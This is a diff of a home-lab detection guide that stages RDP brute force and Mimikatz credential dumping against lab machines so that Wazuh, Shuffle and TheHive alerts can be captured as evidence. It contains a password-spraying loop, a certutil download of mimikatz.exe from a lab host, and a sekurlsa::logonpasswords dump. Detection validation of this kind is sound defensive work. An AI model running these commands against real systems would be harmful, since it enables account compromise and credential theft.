@@ -178,9 +178,10 @@ sudo iptables -L -n | grep 192.168.56.10
 
 ---
 
-## Scenario 04 — RDP brute force → lockout → compromise
+## Scenario 04 — RDP brute force → lockout → interactive session
 
-**Attack (Kali):**
+**Attack, part 1 — brute force until lockout (Kali).** `+auth-only` does the NLA
+credential check only (a Type-3 logon), so each wrong password is a clean 4625:
 ```bash
 mkdir -p evidence/scenario-04-rdp
 for pass in $(cat ~/winpass.txt); do
@@ -189,24 +190,48 @@ for pass in $(cat ~/winpass.txt); do
 done 2>&1 | tee evidence/scenario-04-rdp/attack-output.txt
 ```
 
-**Capture the alerts (manager):**
+**Attack, part 2 — clear the lockout, then open a REAL session (Windows / Kali).**
+The lockout stops the loop (every further try, even the correct one, returns
+`ACCOUNT_LOCKED_OUT`). Policy is 10/10/10, so in the wild you wait 10 min; in the lab
+clear it with ADSI, then RDP in interactively with the known-good password:
+```powershell
+# On Windows: clear the lockout (net user does NOT clear it — use ADSI)
+$u = [ADSI]"WinNT://$env:COMPUTERNAME/Client,user"; $u.IsAccountLocked = $false; $u.SetInfo()
+```
 ```bash
-# account lockout (60115)
-sudo grep '"id":"60115"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
-  > evidence/scenario-04-rdp/alert-60115.json
-# the escalation — successful remote logon (92657)
-sudo grep '"id":"92657"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
-  > evidence/scenario-04-rdp/alert-92657.json
-# a representative failed logon (60122)
-sudo grep '"id":"60122"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
-  > evidence/scenario-04-rdp/alert-60122.json
+# On Kali: a real interactive RDP session (no +auth-only) → Type-10 logon
+xfreerdp3 /u:Client /p:"<known-good>" /v:192.168.56.30 /cert:ignore -clipboard
 ```
 
-**Screenshot:** the three rules firing in sequence →
-`evidence/scenario-04-rdp/wazuh-alerts.png`
+**Capture the alerts (manager).** The successful RDP login records two 4624s — a
+Type-3 NLA pre-auth (92657) and a Type-10 interactive session (92653):
+```bash
+# account lockout (60115, EID 4740)
+sudo grep '"id":"60115"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
+  > evidence/scenario-04-rdp/alert-60115-lockout.json
+# the successful NLA pre-auth — Type 3 (92657, the forwarded headline)
+sudo grep '"id":"92657"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
+  > evidence/scenario-04-rdp/alert-92657-type3-nla.json
+# the genuine interactive RDP session — Type 10 (92653, supporting evidence)
+sudo grep '"id":"92653"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
+  > evidence/scenario-04-rdp/alert-92653-type10-session.json
+```
+```bash
+# a failed logon co-located with the lockout burst (60122). tail -1 can grab a
+# stray later failure; scope by event id below the lockout's id to stay in the burst
+LOCK=$(jq -r .id evidence/scenario-04-rdp/alert-60115-lockout.json)
+sudo jq -c "select(.rule.id==\"60122\" and (.id|tonumber < ($LOCK|tonumber)+2))" \
+  /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
+  > evidence/scenario-04-rdp/alert-60122-failure.json
+```
 
-> Tip: if `Client` is locked from a previous run, reset it on Windows:
-> `net user Client <<new-password>> /active:yes`
+**Screenshots:**
+- Wazuh Discover, the full arc filtered to `rule.id:(60122 or 60115 or 92657 or 92653)`
+  and `targetUserName: Client` → `evidence/scenario-04-rdp/wazuh-rdp-sequence.png`
+- Shuffle runs for the lockout and the logon →
+  `shuffle-rdp-lockout.png`, `shuffle-rdp-compromise.png`
+- TheHive alerts (lockout `Reference` = 60115 id; logon `Reference` = 92657 id) →
+  `thehive-lockout.png`, `thehive-compromise.png`
 
 ---
 
@@ -221,22 +246,27 @@ certutil.exe -urlcache -split -f http://192.168.56.10/mimikatz.exe C:\Users\Publ
 C:\Users\Public\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 ```
 
-**Capture the behavioral alert — rule 92900, the validated detection (manager):**
+**Capture all three alerts (manager).** All fired live in one pass: certutil ingress
+transfer (92075), the behavioral LSASS read (92900, forwarded), and the name-based
+Mimikatz match (100002):
 ```bash
 mkdir -p evidence/scenario-05-creddump
+# behavioral LSASS access — the forwarded headline (92900, EID 10, T1003.001)
 sudo grep '"id":"92900"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
-  > evidence/scenario-05-creddump/wazuh-92900-alert.json
-```
-
-**Optional — capture the custom name-based rule 100002 (manager):**
-```bash
+  > evidence/scenario-05-creddump/alert-92900-lsass.json
+# name-based Mimikatz by PE OriginalFileName (100002, EID 1, T1003)
 sudo grep '"id":"100002"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
-  > evidence/scenario-05-creddump/wazuh-100002-alert.json
+  > evidence/scenario-05-creddump/alert-100002-mimikatz.json
+# certutil ingress tool transfer (92075, EID 1, T1105)
+sudo grep '"id":"92075"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
+  > evidence/scenario-05-creddump/alert-92075-certutil.json
 ```
 
 **Screenshots:** the 92900 alert list and the detail showing
 `sourceImage: m.exe → targetImage: lsass.exe`, `grantedAccess: 0x1010`, and MITRE
-T1003.001 → `evidence/scenario-05-creddump/`.
+T1003.001 (`wazuh-92900-alerts.png`, `wazuh-92900-detail.png`), plus the Shuffle run
+and the TheHive alert (`shuffle-creddump.png`, `thehive-creddump.png`) →
+`evidence/scenario-05-creddump/`.
 
 ---
 
